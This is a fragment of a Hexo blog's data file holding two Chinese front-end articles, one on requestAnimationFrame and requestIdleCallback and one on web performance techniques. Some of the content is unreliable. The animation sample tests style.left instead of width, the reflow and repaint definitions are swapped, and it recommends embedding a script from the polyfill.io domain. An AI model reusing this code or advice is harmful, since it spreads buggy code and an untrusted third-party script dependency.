方法告诉浏览器您希望执行动画，并请求浏览器调用指定的函数在下一次重绘之前更新动画。该方法使用一个回调函数作为参数，这个回调函数会在浏览器重绘之前调用。\n\n> CSS 变换和动画的优势在于浏览器知道动画什么时候开始，因此会计算出正确的循环间隔，在恰当的时候刷新 UI。而对于 JavaScript 动画，浏览器无从知晓什么时候开始。\n\n`requestAnimationFrame` 会把每一帧中的所有DOM操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率\n在隐藏或不可见的元素中，`requestAnimationFrame` 将不会进行重绘或回流，这当然就意味着更少的 CPU、GPU 和内存使用量。\n\n> 使用 `setTimeout` 或 `setInterval` 定义动画会有一些问题：如果队列前面已经加入了其他任务，那动画代码就要等前面的任务完成后再执行。简言之，以毫秒表示的延迟时间并不代表到时候一定会执行动画代码，而仅代表到时候会把代码添加到任务队列中。如果 UI 线程繁忙，比如忙于处理用户操作，那么即使把代码加入队列也不会立即执行。\n\n`requestAnimationFrame` 是由浏览器专门为动画提供的API，在运行时浏览器会自动优化方法的调用，并且如果页面不是激活状态下的话，动画会自动暂停，有效节省了 CPU 开销，采用系统时间间隔，保持最佳绘制效率，不会因为间隔时间过短，造成过度绘制，增加开销；也不会因为间隔时间太长，使用动画卡顿不流畅，让各种网页动画效果能够有一个统一的刷新机制，从而节省系统资源，提高系统性能，改善视觉效果\n\n\n```js\nfunction updateProgress(){\n    var div = document.getElementById(\"status\");\n    div.style.width = (parseInt(div.style.width, 10) + 5) + \"%\";\n    if (div.style.left != \"100%\"){\n        requestAnimationFrame(updateProgress);\n    }\n}\nrequestAnimationFrame(updateProgress); \n```\n\n### 2、requestIdleCallback\n\n`window.requestIdleCallback(fn)` 会在浏览器空闲时期依次调用函数，这就可以让开发者在主事件循环中执行后台或低优先级的任务，而且不会对像动画和用户交互这样延迟触发而且关键的事件产生影响。函数一般会按先进先调用的顺序执行，除非函数在浏览器调用它之前就到了它的超时时间。","source":"_posts/HTML/requestAnimationFrame 与 requestIdleCallback.md","raw":"---\ntitle: requestAnimationFrame 与 requestIdleCallback\ncategories: HTML\ntags: [HTML]\ndate: 2021-05-24 16:32:28\n---\n\n# requestAnimationFrame 与 requestIdleCallback\n\n### 1、requestAnimationFrame\n\n`requestAnimationFrame()` 方法告诉浏览器您希望执行动画，并请求浏览器调用指定的函数在下一次重绘之前更新动画。该方法使用一个回调函数作为参数，这个回调函数会在浏览器重绘之前调用。\n\n> CSS 变换和动画的优势在于浏览器知道动画什么时候开始，因此会计算出正确的循环间隔，在恰当的时候刷新 UI。而对于 JavaScript 动画，浏览器无从知晓什么时候开始。\n\n`requestAnimationFrame` 会把每一帧中的所有DOM操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率\n在隐藏或不可见的元素中，`requestAnimationFrame` 将不会进行重绘或回流，这当然就意味着更少的 CPU、GPU 和内存使用量。\n\n> 使用 `setTimeout` 或 `setInterval` 定义动画会有一些问题：如果队列前面已经加入了其他任务，那动画代码就要等前面的任务完成后再执行。简言之，以毫秒表示的延迟时间并不代表到时候一定会执行动画代码，而仅代表到时候会把代码添加到任务队列中。如果 UI 线程繁忙，比如忙于处理用户操作，那么即使把代码加入队列也不会立即执行。\n\n`requestAnimationFrame` 是由浏览器专门为动画提供的API，在运行时浏览器会自动优化方法的调用，并且如果页面不是激活状态下的话，动画会自动暂停，有效节省了 CPU 开销，采用系统时间间隔，保持最佳绘制效率，不会因为间隔时间过短，造成过度绘制，增加开销；也不会因为间隔时间太长，使用动画卡顿不流畅，让各种网页动画效果能够有一个统一的刷新机制，从而节省系统资源，提高系统性能，改善视觉效果\n\n\n```js\nfunction updateProgress(){\n    var div = document.getElementById(\"status\");\n    div.style.width = (parseInt(div.style.width, 10) + 5) + \"%\";\n    if (div.style.left != \"100%\"){\n        requestAnimationFrame(updateProgress);\n    }\n}\nrequestAnimationFrame(updateProgress); \n```\n\n### 2、requestIdleCallback\n\n`window.requestIdleCallback(fn)` 会在浏览器空闲时期依次调用函数，这就可以让开发者在主事件循环中执行后台或低优先级的任务，而且不会对像动画和用户交互这样延迟触发而且关键的事件产生影响。函数一般会按先进先调用的顺序执行，除非函数在浏览器调用它之前就到了它的超时时间。","slug":"HTML/requestAnimationFrame 与 requestIdleCallback","published":1,"updated":"2021-06-07T11:40:14.884Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmjm7k200005g6r683o8elo","content":"<h1 id=\"requestAnimationFrame-与-requestIdleCallback\"><a href=\"#requestAnimationFrame-与-requestIdleCallback\" class=\"headerlink\" title=\"requestAnimationFrame 与 requestIdleCallback\"></a>requestAnimationFrame 与 requestIdleCallback</h1><h3 id=\"1、requestAnimationFrame\"><a href=\"#1、requestAnimationFrame\" class=\"headerlink\" title=\"1、requestAnimationFrame\"></a>1、requestAnimationFrame</h3><p><code>requestAnimationFrame()</code> 方法告诉浏览器您希望执行动画，并请求浏览器调用指定的函数在下一次重绘之前更新动画。该方法使用一个回调函数作为参数，这个回调函数会在浏览器重绘之前调用。</p>\n<blockquote>\n<p>CSS 变换和动画的优势在于浏览器知道动画什么时候开始，因此会计算出正确的循环间隔，在恰当的时候刷新 UI。而对于 JavaScript 动画，浏览器无从知晓什么时候开始。</p>\n</blockquote>\n<p><code>requestAnimationFrame</code> 会把每一帧中的所有DOM操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率<br>在隐藏或不可见的元素中，<code>requestAnimationFrame</code> 将不会进行重绘或回流，这当然就意味着更少的 CPU、GPU 和内存使用量。</p>\n<blockquote>\n<p>使用 <code>setTimeout</code> 或 <code>setInterval</code> 定义动画会有一些问题：如果队列前面已经加入了其他任务，那动画代码就要等前面的任务完成后再执行。简言之，以毫秒表示的延迟时间并不代表到时候一定会执行动画代码，而仅代表到时候会把代码添加到任务队列中。如果 UI 线程繁忙，比如忙于处理用户操作，那么即使把代码加入队列也不会立即执行。</p>\n</blockquote>\n<p><code>requestAnimationFrame</code> 是由浏览器专门为动画提供的API，在运行时浏览器会自动优化方法的调用，并且如果页面不是激活状态下的话，动画会自动暂停，有效节省了 CPU 开销，采用系统时间间隔，保持最佳绘制效率，不会因为间隔时间过短，造成过度绘制，增加开销；也不会因为间隔时间太长，使用动画卡顿不流畅，让各种网页动画效果能够有一个统一的刷新机制，从而节省系统资源，提高系统性能，改善视觉效果</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">updateProgress</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> div = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">&quot;status&quot;</span>);</span><br><span class=\"line\">    div.style.width = (<span class=\"built_in\">parseInt</span>(div.style.width, <span class=\"number\">10</span>) + <span class=\"number\">5</span>) + <span class=\"string\">&quot;%&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (div.style.left != <span class=\"string\">&quot;100%&quot;</span>)&#123;</span><br><span class=\"line\">        requestAnimationFrame(updateProgress);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">requestAnimationFrame(updateProgress); </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2、requestIdleCallback\"><a href=\"#2、requestIdleCallback\" class=\"headerlink\" title=\"2、requestIdleCallback\"></a>2、requestIdleCallback</h3><p><code>window.requestIdleCallback(fn)</code> 会在浏览器空闲时期依次调用函数，这就可以让开发者在主事件循环中执行后台或低优先级的任务，而且不会对像动画和用户交互这样延迟触发而且关键的事件产生影响。函数一般会按先进先调用的顺序执行，除非函数在浏览器调用它之前就到了它的超时时间。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"requestAnimationFrame-与-requestIdleCallback\"><a href=\"#requestAnimationFrame-与-requestIdleCallback\" class=\"headerlink\" title=\"requestAnimationFrame 与 requestIdleCallback\"></a>requestAnimationFrame 与 requestIdleCallback</h1><h3 id=\"1、requestAnimationFrame\"><a href=\"#1、requestAnimationFrame\" class=\"headerlink\" title=\"1、requestAnimationFrame\"></a>1、requestAnimationFrame</h3><p><code>requestAnimationFrame()</code> 方法告诉浏览器您希望执行动画，并请求浏览器调用指定的函数在下一次重绘之前更新动画。该方法使用一个回调函数作为参数，这个回调函数会在浏览器重绘之前调用。</p>\n<blockquote>\n<p>CSS 变换和动画的优势在于浏览器知道动画什么时候开始，因此会计算出正确的循环间隔，在恰当的时候刷新 UI。而对于 JavaScript 动画，浏览器无从知晓什么时候开始。</p>\n</blockquote>\n<p><code>requestAnimationFrame</code> 会把每一帧中的所有DOM操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率<br>在隐藏或不可见的元素中，<code>requestAnimationFrame</code> 将不会进行重绘或回流，这当然就意味着更少的 CPU、GPU 和内存使用量。</p>\n<blockquote>\n<p>使用 <code>setTimeout</code> 或 <code>setInterval</code> 定义动画会有一些问题：如果队列前面已经加入了其他任务，那动画代码就要等前面的任务完成后再执行。简言之，以毫秒表示的延迟时间并不代表到时候一定会执行动画代码，而仅代表到时候会把代码添加到任务队列中。如果 UI 线程繁忙，比如忙于处理用户操作，那么即使把代码加入队列也不会立即执行。</p>\n</blockquote>\n<p><code>requestAnimationFrame</code> 是由浏览器专门为动画提供的API，在运行时浏览器会自动优化方法的调用，并且如果页面不是激活状态下的话，动画会自动暂停，有效节省了 CPU 开销，采用系统时间间隔，保持最佳绘制效率，不会因为间隔时间过短，造成过度绘制，增加开销；也不会因为间隔时间太长，使用动画卡顿不流畅，让各种网页动画效果能够有一个统一的刷新机制，从而节省系统资源，提高系统性能，改善视觉效果</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">updateProgress</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> div = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">&quot;status&quot;</span>);</span><br><span class=\"line\">    div.style.width = (<span class=\"built_in\">parseInt</span>(div.style.width, <span class=\"number\">10</span>) + <span class=\"number\">5</span>) + <span class=\"string\">&quot;%&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (div.style.left != <span class=\"string\">&quot;100%&quot;</span>)&#123;</span><br><span class=\"line\">        requestAnimationFrame(updateProgress);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">requestAnimationFrame(updateProgress); </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2、requestIdleCallback\"><a href=\"#2、requestIdleCallback\" class=\"headerlink\" title=\"2、requestIdleCallback\"></a>2、requestIdleCallback</h3><p><code>window.requestIdleCallback(fn)</code> 会在浏览器空闲时期依次调用函数，这就可以让开发者在主事件循环中执行后台或低优先级的任务，而且不会对像动画和用户交互这样延迟触发而且关键的事件产生影响。函数一般会按先进先调用的顺序执行，除非函数在浏览器调用它之前就到了它的超时时间。</p>\n"},{"title":"前端性能优化","date":"2021-05-24T08:32:28.000Z","_content":"\n# 前端性能优化\n\n## 一、代码层面\n### 1.1 减少 DOM 元素\nDOM 元素越多、越复杂，则 DOM 操作（即重绘、重排）会越慢\n\n优化方式：\n* 可以使用伪元素、阴影、CSS 实现的内容尽量不要使用 DOM 实现\n* 按需加载，减少不必要的渲染\n* 结构合理，语义化标签\n\n### 1.2 降低 CSS 选择器的复杂性\nCSS 选择器的匹配规则是是*从右往左*的，即先找到符合条件的元素，然后再匹配父元素进行过滤（why? 符合条件的元素远少于不符合条件的元素，可以节约性能）\n\n所以有如下注意事项：\n* 不给ID分类和Class分类添加标签名；（会增加一次过滤）\n* 用子代选择器代替后代选择器；（避免无效的遍历）\n* 用Class分类代替子代选择器；（避免多次遍历）\n* 特殊类别可使用属性选择器；（避免多次遍历）\n* 正确使用可继承的属性；（可从父元素传到子元素）\n* 尽量避免通配符；（首先会遍历所有的元素，然后再过滤）\n\n### 1.2 尽可能使用 flex 布局\n尽量使用 flex 代替浮动、表格等布局，后者会更耗性能且不易维护\n\n### 1.3 使用字体图标代替图片\n字体图标就是将图标制作成一个字体，使用时就跟字体一样，可以设置属性，例如 font-size、color 等，而且字体图标是矢量图，不会失真，生成的文件也较小。\n\n### 1.4 合理使用 will-change\n告知浏览器该元素会有哪些变化的方法，这样浏览器可以在元素属性真正发生变化之前提前做好对应的优化准备工作\n\n### 1.5 使用 content-visibility\n`content-visibility` 属性接受多个值，其中 `auto` 是可立即提高性能的属性。一个具有 `content-visibility: auto` 属性的元素可以获得布局、样式和绘制的限制（区域），如果元素不在屏幕上，这不会渲染其后代。浏览器在不考虑元素任何内容的情况下确定元素的大小，在此处则跳过大多数渲染。\n\n### 1.6 使用 CSS3 GPU 加速\n\n> 在 GPU 渲染的过程中，一些元素会因为符合了某些规则，而被提升为独立的层（黄色边框部分），一旦独立出来，就不会影响其它 DOM 的布局，所以我们可以利用这些规则，将经常变换的 DOM 主动提升到独立的层，那么在浏览器的一帧运行中，就可以减少 Layout 和 Paint 的时间了\n\nCSS 中的以下几个属性能触发硬件加速：\n* transform\n* opacity\n* filter\n* will-change\n\n### 1.7 避免过多的回流与重绘\n* 重绘（reflow）：重新绘制（如改变某个元素的颜色、背景，并没有使布局改变）\n* 重排（repaint）：重新生成布局（如改变某个元素的位置，导致布局改变，同时触发 重排、重绘）\n\n相对于 `Object`、`Array` 操作，DOM 上的操作会慢上几个数量级，即使现代浏览器已经对 DOM 操作（重排、重绘）做了无数优化。所以大部分时候，Web 性能的瓶颈通常在渲染上。\n\n\n> DOM 操作很慢，绝大部分时候是指 DOM 操作所产生的副作用慢（主要是导致了重排），在页面上的任何操作都是有代价的\n\n说明：\n1. 样式表越简单，重排和重绘就越快；\n2. 重排和重绘的 DOM 元素层级越高，成本就越高；\n3. `<table>` 元素的重排和重绘成本高于 `<div>` 元素\n\n优化方式：\n* 批量读写：统一读取属性，然后统一修改 DOM ，减少渲染次数\n* 使用 DOM 片段 `document.createDocumentFragment()`\n* 多次访问同一 DOM 应用局部变量缓存\n* 操作元素时先隐藏，修改完元素后再显示\n* 将元素的 `position` 属性为 `absolute` 或 `fixed` 的元素\n* 使用 `window.requestAnimationFrame()`、`window.requestIdleCallback()` 调节重新渲染\n* 使用虚拟 DOM 技术，如 `React`、`Vue`\n\n### 1.8 使用 preload、prefetch\n* `<link rel=\"preload\"></link>`用于本页面要用到的关键资源，包括关键js、字体、css文件。preload将会把资源得下载顺序权重提高，使得关键数据提前下载好，优化页面打开速度\n* `<link rel=\"prefetch\"></link>`用于加速未来页面里的资源，被标记为 prefetch 的资源，将会被浏览器在空闲时间加载，下载顺序权重比较低\n\n### 1.9 使用 requestAnimationFrame 优化动画\n使用 `setTimeout` 或 `setInterval` 来实现动画的话，回调函数将在帧中的某个时点运行，可能刚好在末尾，可能经常丢失帧，导致卡顿，requestAnimationFrame 会在浏览器下一次重绘前执行，能使动画看上去更加流畅（PS: 当然最好的方式是使用 CSS3 动画）\n\n### 1.10 使用虚拟列表\n虚拟列表其实是按需显示的一种实现，即只对可见区域进行渲染，对非可见区域中的数据不渲染或部分渲染的技术，从而达到极高的渲染性能。详情请看文章末尾的相关链接。\n\n### 1.11 防抖、节流\n用于 onresize、onkeydown 等频繁触发的事件中，可减少请求、DOM 操作等，改善用户体验\n\n* 防抖：在多次触发中(还没执行)，只执行最后一个触发。\n* 节流：在一段时间内，只能执行一次。\n\n### 1.12 图片优化\n* 图片延迟加载：只加载可视区内的图片，根据 `getBoundingClientRect()` 来判断\n* 响应式图片：够根据屏幕大小自动加载合适的图片，可通过 `<picture>` 或 `@media` 来实现\n* 图片压缩：在可接受的范围内压缩图片，压缩后通常能减少 30% 左右的大小，且肉眼看上去无差异\n* 使用 webp 格式的图片：更优的图像数据压缩算法，相比于传统 JPEG、PNG 图片，Webp 可以让图片大小平均减少 70% 左右。\n* 合理使用图片、背景图：装饰性的图片应该使用 CSS 的 `background-image` 标签，而不是使用 `img` 标签\n  * `img` 标签 DOM 解析完后去加载图片，图片加载失败时会显示一个撕裂的小图标标记，**兼顾 SEO 和标签语义化时应该使用 <img />**\n  * `background-image` 内引用的图片会在该规则生效时，才会去下载该图片（有点类似于按需加载），图片加载失败时不会显示异常\n\n### 1.13 使用骨架屏\n提前占好位置，当资源加载完成即可填充，减少页面的回流与重绘，同时还能给用户最直接的反馈，主要用于提升用户体验。\n\n### 1.14 预渲染、服务端渲染（SSR）\n* 有利于 SEO\n* 有利于首屏渲染，提升用户体验\n\n说明：请权衡利弊后，再酌情使用！！\n\n## 二、webpack 相关\n\n### 2.1 Tree Sharking\n用于消除无用的 js 代码，ES6模块依赖关系是确定的，和运行时的状态无关，可以进行可靠的静态分析，这就是 Tree Sharking 的基础\n\n### 2.2 代码拆分\n使用 webpack 提供的 `optimization.splitChunks` 属性，主要作用是提取公共代码，防止代码被重复打包，拆分过大的js文件，合并零散的js文件等。\n\n### 2.3 使用外部扩展 externals\n防止将某些 `import` 的包打包到 bundle 中，而是在运行时再去从外部获取这些扩展依赖。通过这种方式引入的依赖库，不需要 webpack 处理，编译进文件中，在我们需要，使用它的时候可以通过CMD、AMD、或者 window 全局方式访问\n\n例如，可以通过 CDN 去引入 React `<script crossorigin src=\"https://unpkg.com/react@17/umd/react.production.min.js\"></script>`\n\n### 2.4 动态 import()\nwebpack 提供了动态加载的 `import()` 方法，可以实现按需加载我们的代码，并且使用了 promise 式的回调，获取加载的包。在代码中所有被 import() 的模块，都将打成一个单独的包，用于实现页面或组件的按需加载。\n\n### 2.5 动态 polyfill\n\n> 为了浏览器的兼容性，我们常常引入各种 polyfill，但是在构建时静态地引入 polyfill 存在一些问题，比如对于机型和浏览器版本比较新的用户来说，他们完全不需要 polyfill，引入 polyfill 对于这部分用户来说是多余的，从而造成体积变大和性能损失\n\n动态 polyfill 指的是根据不同的浏览器，动态载入需要的 polyfill。 Polyfill.io 通过尝试使用 polyfill 重新创建缺少的功能，可以更轻松地支持不同的浏览器，并且可以大幅度的减少构建体积。\n\n原理：根据你的浏览器 UA 头，判断你是否支持某些特性，从而返回给你一个合适的 polyfill。对于最新的 Chrome 浏览器来说，不需要任何 polyfill，所以返回的内容为空。如在 html 文件中引入 `<script crossorigin=\"anonymous\" src=\"https://polyfill.io/v3/polyfill.js\"></script>`\n\n## 三、HTTP 层面\n\n### 3.1 减少 HTTP 请求数\n一个完整的 HTTP 请求需要经历 DNS 查找，TCP 握手，浏览器发出 HTTP 请求，服务器接收请求，服务器处理请求并发回响应，浏览器接收响应等过程，而如果文件较小，则真正下载数据的时间占比就越小，将多个小文件合并为一个大文件，从而减少 HTTP 请求次数，能提高此比例 \n\n* 每个请求都是有成本的，DNS寻址、与服务器建立连接、发送数据、等待服务器响应、接收数据复杂的过程。（使用缓存功能）\n* 每个请求都需要携带数据，每个请求都需要占用带宽（合并请求，如多个图片合并成一张大图）。\n* 浏览器进行并发请求的请求数是有上限的，因此请求数多了以后，浏览器需要分批进行请求，因此会增加用户的等待时间。（懒加载，只在必要的时机加载）\n\n### 3.2 启用 gzip 压缩\n许多网络服务器可以通过调用第三方模块或使用内置程序将文件压缩为 gzip 格式，然后再发送该压缩文件以供下载。这样可以在下载呈现网站所需的资源时节省一些时间。\n\n> Gzip通常将响应大小减少约 70％\n\n### 3.3 改善服务器响应时间\n将服务器响应时间控制在 200ms 以内。有很多潜在因素都可能会延缓服务器响应，例如应用逻辑缓慢、数据库查询缓慢、路由缓慢、框架、库、资源CPU不足或内存不足等。\n\n### 3.4 使用 CDN 加速\n可降低网络的拥塞状况、提高请求的响应速度，也能够减少源站的负载压力\n\n### 3.5 合理的 HTTP 缓存策略\n尽可能利用缓存，对于文件名中有 hash 值时，设置强缓存，如设置 `cache-control: max-age=2592000` (1个月，或者半年、一年等)\n\n### 3.6 域名分片、域名收敛\n\n域名分片：把页面资源拆分成多个域名进行访问，从而提高页面加载速度。原因在于 Web 浏览器会限制每个域名的并发数量，如 6 个（浏览器有并发限制，是为了防止 DDOS攻击），当并行下载文件超过最大并发数就需要排队等待，如果有多个域名，则每个域名都可以发起 6 个 HTTP 请求，提高并发量。另外，不同的域名也可以防止 cookie 污染。（PS: 主要运用于 PC 端）\n\n域名收敛：将静态资源放在一个域名下不进行发散，主要是为了适应移动端的发展需求，通常 DNS 是一个开销较大的操作，而移动端由于网络带宽和实时性、资源等的限制，这些开销对移动端的用户体验是致命的，因此需要进行域名收敛。（PS: 主要运用于移动端）\n\n### 3.7 使用 HTTP2\n* 二进制分帧\n* 多路复用\n* 首部压缩\n* 流量控制\n* ...\n\n详细介绍可看下面的**相关链接**部分\n\n\n## 相关链接\n* [content-visibility](https://developer.mozilla.org/en-US/docs/Web/CSS/content-visibility)\n* [window.requestAnimationFrame](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestAnimationFrame)\n* [高性能渲染十万条数据(虚拟列表)](https://juejin.cn/post/6844903982742110216)\n* [CDN原理简析](https://juejin.cn/post/6844903873518239752)\n* [一文读懂 HTTP/2 特性](https://zhuanlan.zhihu.com/p/26559480)\n","source":"_posts/HTML/前端性能优化 - 通用篇.md","raw":"---\ntitle: 前端性能优化\ncategories: 面试题\ntags: [面试题]\ndate: 2021-05-24 16:32:28\n---\n\n# 前端性能优化\n\n## 一、代码层面\n### 1.1 减少 DOM 元素\nDOM 元素越多、越复杂，则 DOM 操作（即重绘、重排）会越慢\n\n优化方式：\n* 可以使用伪元素、阴影、CSS 实现的内容尽量不要使用 DOM 实现\n* 按需加载，减少不必要的渲染\n* 结构合理，语义化标签\n\n### 1.2 降低 CSS 选择器的复杂性\nCSS 选择器的匹配规则是是*从右往左*的，即先找到符合条件的元素，然后再匹配父元素进行过滤（why? 符合条件的元素远少于不符合条件的元素，可以节约性能）\n\n所以有如下注意事项：\n* 不给ID分类和Class分类添加标签名；（会增加一次过滤）\n* 用子代选择器代替后代选择器；（避免无效的遍历）\n* 用Class分类代替子代选择器；（避免多次遍历）\n* 特殊类别可使用属性选择器；（避免多次遍历）\n* 正确使用可继承的属性；（可从父元素传到子元素）\n* 尽量避免通配符；（首先会遍历所有的元素，然后再过滤）\n\n### 1.2 尽可能使用 flex 布局\n尽量使用 flex 代替浮动、表格等布局，后者会更耗性能且不易维护\n\n### 1.3 使用字体图标代替图片\n字体图标就是将图标制作成一个字体，使用时就跟字体一样，可以设置属性，例如 font-size、color 等，而且字体图标是矢量图，不会失真，生成的文件也较小。\n\n### 1.4 合理使用 will-change\n告知浏览器该元素会有哪些变化的方法，这样浏览器可以在元素属性真正发生变化之前提前做好对应的优化准备工作\n\n### 1.5 使用 content-visibility\n`content-visibility` 属性接受多个值，其中 `auto` 是可立即提高性能的属性。一个具有 `content-visibility: auto` 属性的元素可以获得布局、样式和绘制的限制（区域），如果元素不在屏幕上，这不会渲染其后代。浏览器在不考虑元素任何内容的情况下确定元素的大小，在此处则跳过大多数渲染。\n\n### 1.6 使用 CSS3 GPU 加速\n\n> 在 GPU 渲染的过程中，一些元素会因为符合了某些规则，而被提升为独立的层（黄色边框部分），一旦独立出来，就不会影响其它 DOM 的布局，所以我们可以利用这些规则，将经常变换的 DOM 主动提升到独立的层，那么在浏览器的一帧运行中，就可以减少 Layout 和 Paint 的时间了\n\nCSS 中的以下几个属性能触发硬件加速：\n* transform\n* opacity\n* filter\n* will-change\n\n### 1.7 避免过多的回流与重绘\n* 重绘（reflow）：重新绘制（如改变某个元素的颜色、背景，并没有使布局改变）\n* 重排（repaint）：重新生成布局（如改变某个元素的位置，导致布局改变，同时触发 重排、重绘）\n\n相对于 `Object`、`Array` 操作，DOM 上的操作会慢上几个数量级，即使现代浏览器已经对 DOM 操作（重排、重绘）做了无数优化。所以大部分时候，Web 性能的瓶颈通常在渲染上。\n\n\n> DOM 操作很慢，绝大部分时候是指 DOM 操作所产生的副作用慢（主要是导致了重排），在页面上的任何操作都是有代价的\n\n说明：\n1. 样式表越简单，重排和重绘就越快；\n2. 重排和重绘的 DOM 元素层级越高，成本就越高；\n3. `<table>` 元素的重排和重绘成本高于 `<div>` 元素\n\n优化方式：\n* 批量读写：统一读取属性，然后统一修改 DOM ，减少渲染次数\n* 使用 DOM 片段 `document.createDocumentFragment()`\n* 多次访问同一 DOM 应用局部变量缓存\n* 操作元素时先隐藏，修改完元素后再显示\n* 将元素的 `position` 属性为 `absolute` 或 `fixed` 的元素\n* 使用 `window.requestAnimationFrame()`、`window.requestIdleCallback()` 调节重新渲染\n* 使用虚拟 DOM 技术，如 `React`、`Vue`\n\n### 1.8 使用 preload、prefetch\n* `<link rel=\"preload\"></link>`用于本页面要用到的关键资源，包括关键js、字体、css文件。preload将会把资源得下载顺序权重提高，使得关键数据提前下载好，优化页面打开速度\n* `<link rel=\"prefetch\"></link>`用于加速未来页面里的资源，被标记为 prefetch 的资源，将会被浏览器在空闲时间加载，下载顺序权重比较低\n\n### 1.9 使用 requestAnimationFrame 优化动画\n使用 `setTimeout` 或 `setInterval` 来实现动画的话，回调函数将在帧中的某个时点运行，可能刚好在末尾，可能经常丢失帧，导致卡顿，requestAnimationFrame 会在浏览器下一次重绘前执行，能使动画看上去更加流畅（PS: 当然最好的方式是使用 CSS3 动画）\n\n### 1.10 使用虚拟列表\n虚拟列表其实是按需显示的一种实现，即只对可见区域进行渲染，对非可见区域中的数据不渲染或部分渲染的技术，从而达到极高的渲染性能。详情请看文章末尾的相关链接。\n\n### 1.11 防抖、节流\n用于 onresize、onkeydown 等频繁触发的事件中，可减少请求、DOM 操作等，改善用户体验\n\n* 防抖：在多次触发中(还没执行)，只执行最后一个触发。\n* 节流：在一段时间内，只能执行一次。\n\n### 1.12 图片优化\n* 图片延迟加载：只加载可视区内的图片，根据 `getBoundingClientRect()` 来判断\n* 响应式图片：够根据屏幕大小自动加载合适的图片，可通过 `<picture>` 或 `@media` 来实现\n* 图片压缩：在可接受的范围内压缩图片，压缩后通常能减少 30% 左右的大小，且肉眼看上去无差异\n* 使用 webp 格式的图片：更优的图像数据压缩算法，相比于传统 JPEG、PNG 图片，Webp 可以让图片大小平均减少 70% 左右。\n* 合理使用图片、背景图：装饰性的图片应该使用 CSS 的 `background-image` 标签，而不是使用 `img` 标签\n  * `img` 标签 DOM 解析完后去加载图片，图片加载失败时会显示一个撕裂的小图标标记，**兼顾 SEO 和标签语义化时应该使用 <img />**\n  * `background-image` 内引用的图片会在该规则生效时，才会去下载该图片（有点类似于按需加载），图片加载失败时不会显示异常\n\n### 1.13 使用骨架屏\n提前占好位置，当资源加载完成即可填充，减少页面的回流与重绘，同时还能给用户最直接的反馈，主要用于提升用户体验。\n\n### 1.14 预渲染、服务端渲染（SSR）\n* 有利于 SEO\n* 有利于首屏渲染，提升用户体验\n\n说明：请权衡利弊后，再酌情使用！！\n\n## 二、webpack 相关\n\n### 2.1 Tree Sharking\n用于消除无用的 js 代码，ES6模块依赖关系是确定的，和运行时的状态无关，可以进行可靠的静态分析，这就是 Tree Sharking 的基础\n\n### 2.2 代码拆分\n使用 webpack 提供的 `optimization.splitChunks` 属性，主要作用是提取公共代码，防止代码被重复打包，拆分过大的js文件，合并零散的js文件等。\n\n### 2.3 使用外部扩展 externals\n防止将某些 `import` 的包打包到 bundle 中，而是在运行时再去从外部获取这些扩展依赖。通过这种方式引入的依赖库，不需要 webpack 处理，编译进文件中，在我们需要，使用它的时候可以通过CMD、AMD、或者 window 全局方式访问\n\n例如，可以通过 CDN 去引入 React `<script crossorigin src=\"https://unpkg.com/react@17/umd/react.production.min.js\"></script>`\n\n### 2.4 动态 import()\nwebpack 提供了动态加载的 `import()` 方法，可以实现按需加载我们的代码，并且使用了 promise 式的回调，获取加载的包。在代码中所有被 import() 的模块，都将打成一个单独的包，用于实现页面或组件的按需加载。\n\n### 2.5 动态 polyfill\n\n> 为了浏览器的兼容性，我们常常引入各种 polyfill，但是在构建时静态地引入 polyfill 存在一些问题，比如对于机型和浏览器版本比较新的用户来说，他们完全不需要 polyfill，引入 polyfill 对于这部分用户来说是多余的，从而造成体积变大和性能损失\n\n动态 polyfill 指的是根据不同的浏览器，动态载入需要的 polyfill。 Polyfill.io 通过尝试使用 polyfill 重新创建缺少的功能，可以更轻松地支持不同的浏览器，并且可以大幅度的减少构建体积。\n\n原理：根据你的浏览器 UA 头，判断你是否支持某些特性，从而返回给你一个合适的 polyfill。对于最新的 Chrome 浏览器来说，不需要任何 polyfill，所以返回的内容为空。如在 html 文件中引入 `<script crossorigin=\"anonymous\" src=\"https://polyfill.io/v3/polyfill.js\"></script>`\n\n## 三、HTTP 层面\n\n### 3.1 减少 HTTP 请求数\n一个完整的 HTTP 请求需要经历 DNS 查找，TCP 握手，浏览器发出 HTTP 请求，服务器接收请求，服务器处理请求并发回响应，浏览器接收响应等过程，而如果文件较小，则真正下载数据的时间占比就越小，将多个小文件合并为一个大文件，从而减少 HTTP 请求次数，能提高此比例 \n\n* 每个请求都是有成本的，DNS寻址、与服务器建立连接、发送数据、等待服务器响应、接收数据复杂的过程。（使用缓存功能）\n* 